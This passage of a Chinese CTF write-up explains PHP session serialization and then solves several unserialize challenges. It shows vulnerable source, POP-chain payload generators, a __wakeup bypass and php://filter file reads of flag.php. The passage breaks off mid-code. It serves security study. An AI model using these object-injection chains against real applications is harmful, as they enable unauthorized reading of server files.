class="string">&quot;dazhuang&quot;</span>;</span><br></pre></td></tr></table></figure><p>php:键名+竖线+经过serialize()函数序列化处理的值</p><p>声明session存储格式为php_serialize</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_hander&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;benben&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;ben&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;b&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?ben=dazhuang&amp;b=<span class="number">666</span></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;dazhuang&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;666&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>php_serialize:经过serialize()函数序列化处理的数组</p><h2 id="php反序列化例题：只截取其中的反序列化部分"><a href="#php反序列化例题：只截取其中的反序列化部分" class="headerlink" title="php反序列化例题：只截取其中的反序列化部分"></a>php反序列化例题：只截取其中的反序列化部分</h2><h3 id="极客大挑战-2019-PHP-1"><a href="#极客大挑战-2019-PHP-1" class="headerlink" title="[极客大挑战 2019]PHP 1"></a>[极客大挑战 2019]PHP 1</h3><p>index.php中，文件包含class.php，下面对传入的参数进行反序列化，那么因为包含class.php，所以会触发里面的魔术方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;class.php&#x27;;</span><br><span class="line">$select = $_GET[&#x27;select&#x27;];</span><br><span class="line">$res=unserialize(@$select);</span><br></pre></td></tr></table></figure><p>class.php中，包含文件flag.php，所以有机会读取到从中读取到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造pop链的关键在于wake_up的绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;admin&#x27;;</span><br><span class="line">    private $password = &#x27;100&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Name();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure><h3 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var=&#x27;php://filter/read=convert.base64-encode/resource=/flag&#x27;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">$b=new Try_Work_Hard();</span><br><span class="line">$c=new Make_a_Change();</span><br><span class="line">$a=new Road_is_Long();</span><br><span class="line">$c-&gt;effort=$b;</span><br><span class="line">$a-&gt;string=$c;</span><br><span class="line">$a-&gt;page=$a;</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这题非常常规，就是魔术方法跳来跳去</p><h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义的is_valid()函数检查每个字符是否在32和125之间，即是否是可打印字符，所以protected在序列化之后会出现不可见字符,不符合上面的要求，绕过方法就是直接改成public，原因是php7.1以上的版本对属性类型不敏感。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br></pre></td></tr></table></figure><p>这里是我们需要关注的题目出口，file_get_contents()把整个文件读入一个字符串中，那么我们就可以将文件名改成我们要读取的文件这里可以看到上面的文件包含，想到了伪协议读取<code>php://filter/read=convert.base64-encode/resource=flag.php</code>。接着要调用这个函数就关注到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">       if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">           $this-&gt;write();</span><br><span class="line">       &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">           $res = $this-&gt;read();</span><br><span class="line">           $this-&gt;output($res);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>当op&#x3D;&#x3D;”2”时会调用read()，然后调用output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private function output($s) &#123;</span><br><span class="line">       echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">       echo $s;</span><br></pre></td></tr></table></figure><p>输出字符串内容<br>然后我们需要考虑如何调用process()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>关注到这里，但是需要绕过强比较，所以op&#x3D;2，既可以绕过强比较又可以让process中的弱比较返回true。<code>__destruct()</code>会由实例化触发或反序列化触发。<br>构造pop链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">        public $op = 2;</span><br><span class="line">        public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">        public $content;</span><br><span class="line">    &#125;</span><br><span class="line">$a = new FileHandler();</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="DASCTF-EZUnserialize"><a href="#DASCTF-EZUnserialize" class="headerlink" title="DASCTF EZUnserialize"></a>DASCTF EZUnserialize</h3><p>这是一题字符减少</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;gqy&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="string">&#x27;a&#x27;</span>.<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nice&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>))));</span><br></pre></td></tr></table></figure><p>目标：通过file_get_contents输出$c的信息，所以可以使$c为flag.php<br>反推开始：1、触发__toString魔术方法<br>         2、触发__destruct魔术方法，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，类B实例化最终被销毁的时候触发<br>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;gqy&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">c</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;c=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b=<span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125; </span><br></pre></td></tr></table></figure><p>这里需要对上面的源代码进行解释：<br><code>$a = new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);</code>将类A实例化并且接受传参，自动触发__construct()，并且参数会传入<code>function __construct($a, $b)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充：<br><img src="/img/77.png"><br>详见：<a href="https://www.icoa.cn/a/957.html">https://www.icoa.cn/a/957.html</a><br>回到正题，接下来将<br>再把序列后的值传给类A：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;N;s:8:&quot;password&quot;;s:55:&quot;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>传进去的序列化值，被当成字符串了。<br>而题目又给了两个方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反序列化操作也给了出来:</span><br><span class="line">$b = unserialize(read(write(serialize($a))));</span><br><span class="line">write方法：把序列化值中的 *(这里是三个字符，chr(0)是为空的)替换成 \0\0\0。</span><br><span class="line">read方法：把\0\0\0，还原成*</span><br></pre></td></tr></table></figure><p>先试一下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title 